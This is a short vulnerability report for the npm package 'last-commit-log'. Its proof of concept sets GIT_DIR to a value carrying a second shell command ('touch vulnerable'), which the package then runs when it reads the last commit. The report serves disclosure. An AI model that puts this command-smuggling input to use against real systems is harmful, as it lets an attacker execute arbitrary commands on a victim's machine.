# Description

`last-commit-log` is vulnerable to `OS Command Injection`.

# Proof of Concept
1. Install the package `npm i last-commit-log`
2. Create the following PoC file:
```
// poc.js
const LCL = require('last-commit-log');
const lcl = new LCL('.');
lcl
.getLastCommit()
.then(commit => console.log(commit));
```
3. Export malicious GIT_DIR string `export GIT_DIR=". ;touch vulnerable;"`

4. Check the files in the current directory using `ls` command.
```
poc.js
```

5. Run `node poc.js`

6. Check the Output using `ls` command
```
poc.js  vulnerable
```
